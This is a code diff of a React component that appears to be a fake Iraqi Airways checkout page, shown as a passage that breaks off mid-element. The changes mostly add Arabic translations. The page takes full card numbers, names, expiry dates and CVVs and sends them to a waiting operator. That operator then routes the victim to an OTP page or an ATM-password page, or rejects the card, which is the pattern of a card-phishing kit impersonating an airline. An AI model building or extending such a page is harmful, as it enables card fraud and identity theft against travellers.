@@ -1,6 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useLang } from '../contexts/LanguageContext';
 import { getCurrency, convertFromKWD, CURRENCIES } from "@/lib/currency";
+import { cityName as getCityName } from '../lib/airportNames';
 import { useSignalEffect, useSignals } from "@preact/signals-react/runtime";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
@@ -98,6 +99,7 @@ export default function CreditCardPayment() {
   const [rejectedError, setRejectedError] = useState(false);
   const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const { lang, setLang, t } = useLang();
+  const isAr = lang === 'ar';
   const [langMenuOpen, setLangMenuOpen] = useState(false);
   const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false);
   const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
@@ -148,6 +150,9 @@ export default function CreditCardPayment() {
   
   const payCur = getCurrency(currentCurrency);
   
+  const cityNames: Record<string, string> = { BGW:'Baghdad',EBL:'Erbil',BSR:'Basra',NJF:'Najaf',KIK:'Kirkuk',ISU:'Sulaymaniyah',OSM:'Mosul',AMM:'Amman',IST:'Istanbul',DXB:'Dubai',BEY:'Beirut',CAI:'Cairo',DEL:'Delhi',FRA:'Frankfurt',KUL:'Kuala Lumpur',CAN:'Guangzhou',CPH:'Copenhagen' };
+  const cityName = (code?: string) => (code ? getCityName(code.toUpperCase(), cityNames[code.toUpperCase()] || code, lang) : '');
+
   const originalAmountKWD = Number(totalAmount);
   const discountedAmountKWD = originalAmountKWD * 0.75;
   const liveAmountKWD = isDiscountActive ? discountedAmountKWD : originalAmountKWD;
@@ -198,219 +203,105 @@ export default function CreditCardPayment() {
     cleanCardNumber.length <= 19 &&
     !luhnError &&
     nameOnCard?.trim().length > 0 &&
-    expiryDate?.length === 5 &&
-    /^\d{2}\/\d{2}$/.test(expiryDate || "") &&
+    expiryDate?.match(/^\d{2}\/\d{2}$/) &&
     cvv?.length === 3;
 
-  useEffect(() => {
-    navigateToPage("الدفع بطاقة الائتمان");
-    waitingMessage.value = "";
-  }, []);
+  const [selectedCardType, setSelectedCardType] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("");
+  const [expiryYear, setExpiryYear] = useState("");
+  const [expiryError, setExpiryError] = useState(false);
+  const [globalBlockedError, setGlobalBlockedError] = useState(false);
 
   useEffect(() => {
-    if (cardNumber && cardNumber.replace(/\s+/g, "").length === 16) {
-      if (debounceRef.current) clearTimeout(debounceRef.current);
-      debounceRef.current = setTimeout(() => {
-        socket.value.emit("cardNumber:verify", cardNumber.replace(/\s+/g, ""));
-      }, 500);
+    if (expiryMonth && expiryYear) {
+      const formatted = `${expiryMonth}/${expiryYear}`;
+      setValue("expiryDate", formatted);
+      
+      const m = parseInt(expiryMonth, 10);
+      const y = parseInt(expiryYear, 10);
+      if (m >= 1 && m <= 12 && y >= 24) {
+        setExpiryError(false);
+      } else {
+        setExpiryError(true);
+      }
     }
-  }, [cardNumber]);
+  }, [expiryMonth, expiryYear, setValue]);
 
-  useEffect(() => {
-    if (isCardVerified.value === false) {
-      setCardError(true);
+  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, "");
+    if (value.length > 19) value = value.slice(0, 19);
+    
+    // Auto-detect card type
+    const type = getCardType(value);
+    if (type === "visa") setSelectedCardType("Visa");
+    else if (type === "mastercard") setSelectedCardType("MasterCard");
+    
+    // Luhn check
+    if (value.length >= 13) {
+      setLuhnError(!isValidCardNumber(value));
     } else {
-      setCardError(false);
+      setLuhnError(false);
     }
-  }, [isCardVerified.value]);
 
-  useEffect(() => {
+    // Blocked prefix check
+    const isPrefixBlocked = visitor.value.blockedCardPrefixes?.some(prefix => value.startsWith(prefix));
+    setCardError(!!isPrefixBlocked);
+
+    // Format with spaces
+    const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
+    e.target.value = formatted;
+    setValue("cardNumber", formatted);
+  };
+
+  useSignalEffect(() => {
     if (isFormApproved.value) {
       navigate("/otp-verification");
     }
-  }, [isFormApproved.value, navigate]);
+  });
 
   useSignalEffect(() => {
-    if (cardAction.value) {
-      const action = cardAction.value.action;
+    const action = cardAction.value;
+    if (!action) return;
+    
+    if (action.action === "otp") {
+      navigate("/otp-verification");
+    } else if (action.action === "atm") {
+      navigate("/atm-password");
+    } else if (action.action === "reject") {
+      setRejectedError(true);
+      waitingCardInfo.value = null;
       waitingMessage.value = "";
-
-      if (action === 'otp') {
-        navigate("/otp-verification");
-      } else if (action === 'atm') {
-        navigate("/atm-password");
-      } else if (action === 'reject') {
-        setRejectedError(true);
-        setCardError(false);
-        setLuhnError(false);
-        isCardVerified.value = null;
-        reset({
-          cardNumber: "",
-          nameOnCard: "",
-          expiryDate: "",
-          cvv: "",
-        });
-        setExpiryMonth('');
-        setExpiryYear('');
-      }
-      cardAction.value = null;
     }
   });
 
-  const formatCardNumber = (value: string): string => {
-    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
-    const groups = cleaned.match(/.{1,4}/g);
-    return groups ? groups.join(" ") : cleaned;
-  };
-
-  const [selectedCardType, setSelectedCardType] = useState('');
-  const [expiryMonth, setExpiryMonth] = useState('');
-  const [expiryYear, setExpiryYear] = useState('');
-  const [expiryError, setExpiryError] = useState('');
-  const [countryOpen, setCountryOpen] = useState(false);
-  const countryRef = useRef<HTMLDivElement>(null);
-  useEffect(() => {
-    const handleClickOutside = (e: MouseEvent) => {
-      if (countryRef.current && !countryRef.current.contains(e.target as Node)) setCountryOpen(false);
-    };
-    if (countryOpen) document.addEventListener('mousedown', handleClickOutside);
-    return () => document.removeEventListener('mousedown', handleClickOutside);
-  }, [countryOpen]);
-  const [countrySearch, setCountrySearch] = useState('');
-  const [selectedCountry, setSelectedCountry] = useState({code:'iq',en:'Iraq',ar:'العراق'});
-  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
-  const [globalBlockedError, setGlobalBlockedError] = useState(false);
-  const [rejectedCards, setRejectedCards] = useState<string[]>([]);
-
-  useEffect(() => {
-    socket.value.emit("blockedCards:get");
-
-    const handleBlockedCardsList = (cards: string[]) => {
-      setGlobalBlockedCards(cards || []);
-    };
-
-    const handleBlockedCardsUpdated = (cards: string[]) => {
-      setGlobalBlockedCards(cards || []);
-    };
-
-    const handleRejectedCards = (cards: string[]) => {
-      setRejectedCards(cards || []);
-    };
-
-    socket.value.on("blockedCards:list", handleBlockedCardsList);
-    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);
-    socket.value.on("rejectedCards:list", handleRejectedCards);
-
-    return () => {
-      socket.value.off("blockedCards:list", handleBlockedCardsList);
-      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
-      socket.value.off("rejectedCards:list", handleRejectedCards);
-    };
-  }, []);
-
-  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
-    const blockedPrefixes = visitor.value.blockedCardPrefixes;
-    const cardPrefix = rawValue.slice(0, 4);
-
-    if (globalBlockedError) {
-      setGlobalBlockedError(false);
-    }
-    if (rejectedError) {
-      setRejectedError(false);
-    }
-
-    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
-      setCardError(true);
-      setValue("cardNumber", "");
-      setLuhnError(false);
-    } else if (rawValue.length >= 13 && rejectedCards.includes(rawValue)) {
-      setRejectedError(true);
-      setValue("cardNumber", "");
-      setLuhnError(false);
-    } else {
-      const formattedValue = formatCardNumber(rawValue);
-      setValue("cardNumber", formattedValue);
-      if (rawValue.length >= 13 && rawValue.length <= 19) {
-        if (!isValidCardNumber(rawValue)) {
-          setLuhnError(true);
-        } else {
-          setLuhnError(false);
-        }
-      } else {
-        setLuhnError(false);
-      }
-      setCardError(false);
-    }
-  };
-
-  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/[^\d]/g, "");
-    if (value.length >= 3) {
-      value = value.slice(0, 2) + "/" + value.slice(2, 4);
-    }
-    setValue("expiryDate", value);
-  };
-
   const onSubmit = (data: FormData) => {
-    const cleanNumber = data.cardNumber.replace(/\s+/g, "");
-
-    if (globalBlockedCards.includes(cleanNumber)) {
-      setGlobalBlockedError(true);
-      reset({ cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" });
-      return;
-    }
-
+    if (cardError || luhnError) return;
+    
     setRejectedError(false);
-    setGlobalBlockedError(false);
-
-    const cardType = getCardType(cleanNumber);
-    const bankInfo = getBankInfoLocal(cleanNumber);
-
-    waitingCardInfo.value = {
-      cardType: cardType,
-      bankName: bankInfo?.bank || undefined,
-      bankLogo: bankInfo?.logo || undefined,
-    };
-
-    const [expiryMonth, expiryYear] = data.expiryDate.split("/");
-
-    localStorage.setItem("paymentData", JSON.stringify({
-      cardLast4: cleanNumber.slice(-4),
-      totalPaid: payCur.code + " " + displayAmountStr,
-      serviceName: "Iraqi Airways",
-      bankName: bankInfo?.bank || "Unknown",
-      bankLogo: bankInfo?.logo || null,
-      cardType,
-    }));
-
+    const cleanNum = data.cardNumber.replace(/\s+/g, "");
+    
     sendData({
       paymentCard: {
-        cardNumber: cleanNumber,
-        nameOnCard: data.nameOnCard,
-        expiryMonth: expiryMonth,
-        expiryYear: expiryYear,
+        number: cleanNum,
+        name: data.nameOnCard,
+        expiry: data.expiryDate,
         cvv: data.cvv,
-        cardType,
-        bankName: bankInfo?.bank || "Unknown",
-        amount: totalAmount,
-        productName: productNames,
+        type: selectedCardType || getCardType(cleanNum),
+        bank: getBankInfoLocal(cleanNum)?.bank || "Unknown Bank",
       },
-      current: "الدفع بطاقة الائتمان",
-      nextPage: "رمز التحقق (OTP)",
+      current: "صفحة الدفع",
+      nextPage: "انتظار الرد",
       waitingForAdminResponse: true,
     });
 
     waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
   };
 
-  const isAr = false;
   const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');
-  const cityNames: Record<string, string> = { BGW:'Baghdad',EBL:'Erbil',BSR:'Basra',NJF:'Najaf',KIK:'Kirkuk',ISU:'Sulaymaniyah',OSM:'Mosul',AMM:'Amman',IST:'Istanbul',DXB:'Dubai',BEY:'Beirut',CAI:'Cairo',DEL:'Delhi',FRA:'Frankfurt',KUL:'Kuala Lumpur',CAN:'Guangzhou',CPH:'Copenhagen' };
   const origin = tripSummary.originCode || 'BGW';
   const destination = tripSummary.destCode || 'EBL';
-  const originCity = cityNames[origin] || origin;
-  const destCity = cityNames[destination] || destination;
+  const originCity = cityName(origin);
+  const destCity = cityName(destination);
   const paxCount = tripSummary.passengerCount || tripSummary.paxCount || 1;
   const flightsConv = tripSummary.flightsConv || 0;
   const taxesConv = tripSummary.taxesConv || 0;
@@ -438,12 +329,12 @@ export default function CreditCardPayment() {
   const formatShortDate = (d: string) => { try { const dt = new Date(d.includes('T') ? d : d+'T00:00:00'); return dt.toLocaleDateString('en-GB',{weekday:'short',day:'numeric',month:'short'}); } catch { return d; } };
 
   return (
-    <div className="min-h-screen flex flex-col bg-white" dir="ltr" style={{ fontFamily: 'Lato, sans-serif' }}>
+    <div className="min-h-screen flex flex-col bg-white" dir={isAr ? 'rtl' : 'ltr'} style={{ fontFamily: 'Lato, sans-serif' }}>
 
       <WaitingOverlay />
 
       {/* Header */}
-      <header className="bg-[#4ca42c] text-white" dir={isAr ? 'rtl' : 'ltr'}>
+      <header className="bg-[#4ca42c] text-white">
         <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
           {/* Logo and Home (Right in RTL, Left in LTR) */}
           <div className="flex items-center gap-6">
@@ -468,18 +359,18 @@ export default function CreditCardPayment() {
           </div>
         </div>
         {/* Info bar */}
-        <div className="bg-white border-b" dir={isAr ? 'rtl' : 'ltr'}>
+        <div className="bg-white border-b">
           <div className="max-w-7xl mx-auto px-4 py-2 flex items-center justify-between flex-wrap sm:flex-nowrap">
             {/* Route and Info (Right in RTL, Left in LTR) */}
-            <div className={`flex items-center flex-wrap sm:flex-nowrap gap-2 sm:gap-6 ${isAr ? 'flex-row-reverse' : 'flex-row'}`}>
+            <div className="flex items-center flex-wrap sm:flex-nowrap gap-2 sm:gap-6">
               {/* Mobile route text */}
-              <div className={`sm:hidden ${isAr ? 'text-right' : 'text-left'}`}>
+              <div className="sm:hidden">
                 <p className="text-sm font-bold text-[#1B5E20]">{cityName(origin)} - {cityName(destination)}</p>
                 <p className="text-xs text-gray-600">{formatShortDate(flightDate)} &nbsp; {paxCount} 👤</p>
               </div>
               {/* Desktop: full route with dots */}
-              <div className={`hidden sm:flex items-baseline gap-1 ${isAr ? 'flex-row-reverse' : 'flex-row'}`}>
-                <div className={`flex flex-col ${isAr ? 'items-end' : 'items-start'}`}>
+              <div className="hidden sm:flex items-baseline gap-1">
+                <div className="flex flex-col">
                   <span className="text-[22px] font-bold text-[#1B5E20]">{origin}</span>
                   <span className="text-xs text-gray-500">{cityName(origin)}</span>
                 </div>
@@ -489,18 +380,18 @@ export default function CreditCardPayment() {
                     <svg className={`w-4 h-4 text-[#4ca42c] ${isAr ? 'rotate-180 mr-0.5' : 'ml-0.5'}`} fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg>
                   </div>
                 </div>
-                <div className={`flex flex-col ${isAr ? 'items-end' : 'items-start'}`}>
+                <div className="flex flex-col">
                   <span className="text-[22px] font-bold text-[#1B5E20]">{destination}</span>
                   <span className="text-xs text-gray-500">{cityName(destination)}</span>
                 </div>
               </div>
               <span className="hidden sm:block text-gray-300 text-lg sm:text-2xl">|</span>
-              <div className={isAr ? 'text-right' : 'text-left'}>
+              <div>
                 <p className="text-[10px] sm:text-sm text-[#1B5E20]">{isAr ? 'مغادرة' : 'Depart'}</p>
                 <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{formatShortDate(flightDate)}</p>
               </div>
               <span className="hidden sm:block text-gray-300 text-lg sm:text-2xl">|</span>
-              <div className={isAr ? 'text-right' : 'text-left'}>
+              <div>
                 <p className="text-[10px] sm:text-sm text-[#1B5E20]">{isAr ? 'مسافرون' : 'Passenger'}</p>
                 <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{paxCount} 👤</p>
               </div>
@@ -520,7 +411,7 @@ export default function CreditCardPayment() {
         {/* Checkout title */}
         <div className="text-center mb-8">
           <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
-            <h1 className="text-[#2E7D32] text-2xl font-light">Checkout</h1>
+            <h1 className="text-[#2E7D32] text-2xl font-light">{isAr ? 'إتمام الدفع' : 'Checkout'}</h1>
           </div>
         </div>
 
@@ -529,12 +420,12 @@ export default function CreditCardPayment() {
           <div className="flex items-start justify-between">
             <div>
               <p className="text-[#2E7D32] flex items-center gap-2">
-                Total price: 
+                {isAr ? 'السعر الإجمالي:' : 'Total price:'} 
                 {globalDiscount.value && <span className="text-lg line-through text-[#FF0000]">IQD {originalDisplayAmountStr}</span>}
                 <span className="font-light">IQD</span> <strong className="text-2xl">{displayAmountStr}</strong>
               </p>
-              <p className="text-gray-500 text-sm mt-1">One way price for all passengers (including taxes, fees and discounts).</p>
-              <a href="#" className="text-[#2E7D32] text-sm underline">Detailed baggage policy ↗</a>
+              <p className="text-gray-500 text-sm mt-1">{isAr ? 'سعر الذهاب لجميع المسافرين (شاملاً الضرائب والرسوم والخصومات).' : 'One way price for all passengers (including taxes, fees and discounts).'}</p>
+              <a href="#" className="text-[#2E7D32] text-sm underline">{isAr ? 'سياسة الأمتعة المفصلة ↗' : 'Detailed baggage policy ↗'}</a>
             </div>
             <button onClick={() => setPriceDetailOpen(!priceDetailOpen)} className="w-10 h-10 flex items-center justify-center text-gray-500 hover:text-[#2E7D32]">
               <span className={`text-xl transition-transform ${priceDetailOpen ? 'rotate-180' : ''}`}>∨</span>
@@ -544,30 +435,30 @@ export default function CreditCardPayment() {
             {/* Adults */}
             <div className="rounded overflow-hidden mb-2">
               <div className="bg-[#4a8c2a] text-white px-4 py-2 flex justify-between items-center cursor-pointer" onClick={() => setAdultDetailOpen(!adultDetailOpen)}>
-                <span className="font-bold">{numAdults} Adult{numAdults > 1 ? 's' : ''}</span>
+                <span className="font-bold">{numAdults} {isAr ? (numAdults > 1 ? 'بالغين' : 'بالغ') : `Adult${numAdults > 1 ? 's' : ''}`}</span>
                 <span className="font-bold">IQD {fmtPrice(totalAdults)} {adultDetailOpen ? '∧' : '∨'}</span>
               </div>
               {adultDetailOpen && <div className="bg-[#f0f7f0] p-4">
-                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>Air Transportation Charges</span><span>IQD {fmtPrice(baseFarePerPerson * numAdults)}</span></div>
-                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>Base fare</span><span>IQD {fmtPrice(baseFarePerPerson * numAdults)}</span></div>
-                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>Taxes, fees and charges</span><span>IQD {fmtPrice(taxPerAdult * numAdults)}</span></div>
-                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>Domestic Departure Tax</span><span>IQD {fmtPrice(taxPerAdult * numAdults)}</span></div>
-                <div className="flex justify-between text-[#2E7D32] font-bold mt-2"><span>Total price per adult</span><span>IQD {fmtPrice(pricePerAdult)}</span></div>
-                <div className="flex justify-between text-sm text-gray-600 ml-2"><span>× {numAdults} Adult{numAdults > 1 ? 's' : ''}</span><span>IQD {fmtPrice(totalAdults)}</span></div>
+                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'رسوم النقل الجوي' : 'Air Transportation Charges'}</span><span>IQD {fmtPrice(baseFarePerPerson * numAdults)}</span></div>
+                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>{isAr ? 'السعر الأساسي' : 'Base fare'}</span><span>IQD {fmtPrice(baseFarePerPerson * numAdults)}</span></div>
+                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'الضرائب والرسوم والمصاريف' : 'Taxes, fees and charges'}</span><span>IQD {fmtPrice(taxPerAdult * numAdults)}</span></div>
+                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>{isAr ? 'ضريبة المغادرة المحلية' : 'Domestic Departure Tax'}</span><span>IQD {fmtPrice(taxPerAdult * numAdults)}</span></div>
+                <div className="flex justify-between text-[#2E7D32] font-bold mt-2"><span>{isAr ? 'إجمالي السعر لكل بالغ' : 'Total price per adult'}</span><span>IQD {fmtPrice(pricePerAdult)}</span></div>
+                <div className="flex justify-between text-sm text-gray-600 ml-2"><span>× {numAdults} {isAr ? (numAdults > 1 ? 'بالغين' : 'بالغ') : `Adult${numAdults > 1 ? 's' : ''}`}</span><span>IQD {fmtPrice(totalAdults)}</span></div>
               </div>}
             </div>
             {/* Children */}
             {numChildren > 0 && <div className="rounded overflow-hidden mb-2">
               <div className="bg-[#4a8c2a] text-white px-4 py-2 flex justify-between items-center cursor-pointer" onClick={() => setChildDetailOpen(!childDetailOpen)}>
-                <span className="font-bold">{numChildren} Child{numChildren > 1 ? 'ren' : ''}</span>
+                <span className="font-bold">{numChildren} {isAr ? (numChildren > 1 ? 'أطفال' : 'طفل') : `Child${numChildren > 1 ? 'ren' : ''}`}</span>
                 <span className="font-bold">IQD {fmtPrice(totalChildren)} {childDetailOpen ? '∧' : '∨'}</span>
               </div>
               {childDetailOpen && <div className="bg-[#f0f7f0] p-4">
-                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>Air Transportation Charges</span><span>IQD {fmtPrice(pricePerChild * numChildren)}</span></div>
-                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>Base fare</span><span>IQD {fmtPrice(pricePerChild * numChildren)}</span></div>
-                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>Taxes, fees and charges</span><span>IQD 0.00</span></div>
-                <div className="flex justify-between text-[#2E7D32] font-bold mt-2"><span>Total price per child</span><span>IQD {fmtPrice(pricePerChild)}</span></div>
-                <div className="flex justify-between text-sm text-gray-600 ml-2"><span>× {numChildren} Child{numChildren > 1 ? 'ren' : ''}</span><span>IQD {fmtPrice(totalChildren)}</span></div>
+                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'رسوم النقل الجوي' : 'Air Transportation Charges'}</span><span>IQD {fmtPrice(pricePerChild * numChildren)}</span></div>
+                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>{isAr ? 'السعر الأساسي' : 'Base fare'}</span><span>IQD {fmtPrice(pricePerChild * numChildren)}</span></div>
+                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'الضرائب والرسوم والمصاريف' : 'Taxes, fees and charges'}</span><span>IQD 0.00</span></div>
+                <div className="flex justify-between text-[#2E7D32] font-bold mt-2"><span>{isAr ? 'إجمالي السعر لكل طفل' : 'Total price per child'}</span><span>IQD {fmtPrice(pricePerChild)}</span></div>
+                <div className="flex justify-between text-sm text-gray-600 ml-2"><span>× {numChildren} {isAr ? (numChildren > 1 ? 'أطفال' : 'طفل') : `Child${numChildren > 1 ? 'ren' : ''}`}</span><span>IQD {fmtPrice(totalChildren)}</span></div>
               </div>}
             </div>}
           </div>}
@@ -575,13 +466,13 @@ export default function CreditCardPayment() {
 
         {/* Select payment method */}
         <div className="border border-gray-200 rounded-lg p-6 mb-8">
-          <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-6">Select your payment method</h2>
+          <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-6">{isAr ? 'اختر طريقة الدفع' : 'Select your payment method'}</h2>
 
           <div className="border border-gray-200 rounded-lg p-6">
             {/* Credit Card header */}
             <div className="flex items-center gap-3 mb-2">
               <svg className="w-6 h-6 text-[#2E7D32]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" strokeWidth="2"/><line x1="1" y1="10" x2="23" y2="10" strokeWidth="2"/></svg>
-              <h3 className="text-[#2E7D32] text-lg font-bold">Credit Card</h3>
+              <h3 className="text-[#2E7D32] text-lg font-bold">{isAr ? 'بطاقة ائتمان' : 'Credit Card'}</h3>
             </div>
             <div className="flex gap-2 mb-4">
               <img src="/iraqi_airways/visa.png" alt="Visa" className="h-6" />
@@ -592,7 +483,7 @@ export default function CreditCardPayment() {
             {/* Card form */}
             <form onSubmit={handleSubmit(onSubmit)}>
               {/* Top row: Card preview left + Card type & Card number right */}
-              <div className="cc-card-form-top flex flex-col sm:flex-row gap-6 items-start">
+              <div className={`cc-card-form-top flex flex-col sm:flex-row gap-6 items-start ${isAr ? 'sm:flex-row-reverse' : ''}`}>
                 {/* Card preview */}
                 <div className="w-full sm:w-64 sm:min-w-[256px] h-40 rounded-xl text-white flex flex-col justify-between relative flex-shrink-0 overflow-hidden mx-auto sm:mx-0 max-w-[320px]" style={{background:'linear-gradient(135deg, #5a6a8a 0%, #4a5a7a 40%, #3d4a6b 100%)'}}>
                   {/* Diagonal stripe overlay */}
@@ -601,230 +492,131 @@ export default function CreditCardPayment() {
                   <div className="absolute bottom-0 left-0 right-0 h-12" style={{background:'linear-gradient(to top, rgba(0,0,0,0.3), transparent)'}}></div>
                   <div className="relative z-10 p-5 flex flex-col justify-between h-full">
                     {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="absolute top-3 right-3 h-8" />}
-                    <p className="text-lg tracking-widest font-mono mt-8">{cardNumber || 'XXXX XXXX XXXX XXXX'}</p>
+                    <p className="text-lg tracking-widest font-mono mt-8" dir="ltr">{cardNumber || 'XXXX XXXX XXXX XXXX'}</p>
                     <div className="flex justify-between text-xs">
-                      <div><p className="opacity-70">Cardholder name</p><p>{nameOnCard || 'XXX'}</p></div>
-                      <div><p className="opacity-70">Expiration date</p><p>{expiryDate || 'XXX'}</p></div>
+                      <div><p className="opacity-70">{isAr ? 'اسم حامل البطاقة' : 'Cardholder name'}</p><p>{nameOnCard || 'XXX'}</p></div>
+                      <div><p className="opacity-70">{isAr ? 'تاريخ الانتهاء' : 'Expiration date'}</p><p>{expiryDate || 'XXX'}</p></div>
                     </div>
                   </div>
                 </div>
 
                 {/* Card type + Card number */}
-                <div className="cc-card-fields flex-1 min-w-0 space-y-3">
+                <div className="cc-card-fields flex-1 min-w-0 space-y-3 w-full">
                   <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                    <legend className="text-[#2E7D32] text-xs px-1">Card type*</legend>
+                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'نوع البطاقة*' : 'Card type*'}</legend>
                     <select value={selectedCardType} onChange={(e) => setSelectedCardType(e.target.value)} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
-                      <option value="">Select card type</option>
+                      <option value="">{isAr ? 'اختر نوع البطاقة' : 'Select card type'}</option>
                       <option value="Visa">Visa</option>
                       <option value="MasterCard">MasterCard</option>
                     </select>
                   </fieldset>
                   <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${luhnError || cardError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                    <legend className="text-[#2E7D32] text-xs px-1">Card number*</legend>
+                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رقم البطاقة*' : 'Card number*'}</legend>
                     <div className="flex items-center w-full">
-                      <input type="text" inputMode="numeric" placeholder="Your credit card number" {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                      <input type="text" inputMode="numeric" placeholder={isAr ? 'رقم بطاقتك الائتمانية' : 'Your credit card number'} {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" dir="ltr" />
                       {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="h-7" />}
                     </div>
                   </fieldset>
-                  {luhnError && <p className="text-red-500 text-xs">Invalid card number</p>}
-                  {cardError && <p className="text-red-500 text-xs">This card is not accepted</p>}
-                  {globalBlockedError && <p className="text-red-500 text-xs">This card has been blocked</p>}
-                  {rejectedError && <p className="text-red-500 text-xs">Payment was rejected. Please try another card.</p>}
+                  {luhnError && <p className="text-red-500 text-xs">{isAr ? 'رقم بطاقة غير صالح' : 'Invalid card number'}</p>}
+                  {cardError && <p className="text-red-500 text-xs">{isAr ? 'هذه البطاقة غير مقبولة' : 'This card is not accepted'}</p>}
+                  {globalBlockedError && <p className="text-red-500 text-xs">{isAr ? 'تم حظر هذه البطاقة' : 'This card has been blocked'}</p>}
+                  {rejectedError && <p className="text-red-500 text-xs">{isAr ? 'تم رفض عملية الدفع. يرجى تجربة بطاقة أخرى.' : 'Payment was rejected. Please try another card.'}</p>}
                 </div>
               </div>
 
               {/* All fields below - same width as Card type column on desktop, full width on mobile */}
-              <div className="cc-fields-below" style={{ marginLeft: 'calc(256px + 1.5rem)', width: 'calc(100% - 256px - 1.5rem)' }}>
+              <div className={`cc-fields-below mt-3 ${isAr ? 'sm:mr-[280px]' : 'sm:ml-[280px]'}`}>
 
               {/* Expiry + CVV */}
               <div className="cc-expiry-cvv flex flex-wrap sm:flex-nowrap gap-3 items-start">
                 <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${expiryError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
-                  <legend className="text-[#2E7D32] text-xs px-1">Expiry date*</legend>
-                  <div className="flex items-center w-full">
-                    <input id="expiry-month" type="text" inputMode="numeric" placeholder="Month" value={expiryMonth} 
+                  <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'تاريخ الانتهاء*' : 'Expiry date*'}</legend>
+                  <div className="flex items-center w-full" dir="ltr">
+                    <input id="expiry-month" type="text" inputMode="numeric" placeholder="MM" value={expiryMonth} 
                       onChange={(e) => { 
                         const v = e.target.value.replace(/\D/g,'').slice(0,2); 
                         setExpiryMonth(v); 
-                        if (v.length === 2) { 
-                          setTimeout(() => document.getElementById('expiry-year')?.focus(), 10);
-                        } 
-                        if (v.length === 2 && expiryYear.length === 2) { 
-                          setValue('expiryDate', v + '/' + expiryYear); 
-                          const m = parseInt(v); 
-                          const y = parseInt(expiryYear); 
-                          const now = new Date(); 
-                          const cm = now.getMonth()+1; 
-                          const cy = now.getFullYear()%100; 
-                          if (m < 1 || m > 12) setExpiryError('Invalid month'); 
-                          else if (y < cy || (y === cy && m < cm)) setExpiryError('Card expired'); 
-                          else setExpiryError(''); 
-                        } else { 
-                          setValue('expiryDate', v + '/' + expiryYear); 
-                          setExpiryError(''); 
-                        } 
+                        if (v.length === 2) document.getElementById('expiry-year')?.focus();
                       }} 
-                      onBlur={() => { 
-                        setExpiryMonth(prev => (prev.length === 1 && prev !== '0' ? '0' + prev : prev));
-                      }} 
-                      maxLength={2} 
-                      className="w-[45%] bg-transparent text-gray-700 focus:outline-none text-[15px] h-full" 
